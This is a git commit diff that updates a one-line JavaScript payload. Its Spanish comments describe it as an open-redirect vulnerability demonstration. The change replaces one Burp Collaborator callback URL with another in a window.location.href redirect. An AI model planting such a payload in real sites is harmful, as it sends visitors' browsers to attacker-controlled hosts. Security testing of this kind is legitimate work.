83dd1ae8c7b7f890417a11d85b31dc578d445c49
Saher Delgado <saherdelgado@gmail.com>
2024-12-31 11:02:43 -0300

    Update redirect_payload_js.js
    update collaborator url

--- redirect_payload_js.js
+++ redirect_payload_js.js
@@ -2,4 +2,4 @@
 
 // Este script redirige al usuario a una URL específica para demostrar una vulnerabilidad de redireccionamiento
 // Usamos un dominio de prueba para evitar causar daño real.
-window.location.href = "http://2ile3dhv0shoao6wfdn8rvsmxd34r4ft.oastify.com";
+window.location.href = "http://6v2mfhy614bztfwiq7e4p2sef5lw9xxm.oastify.com";
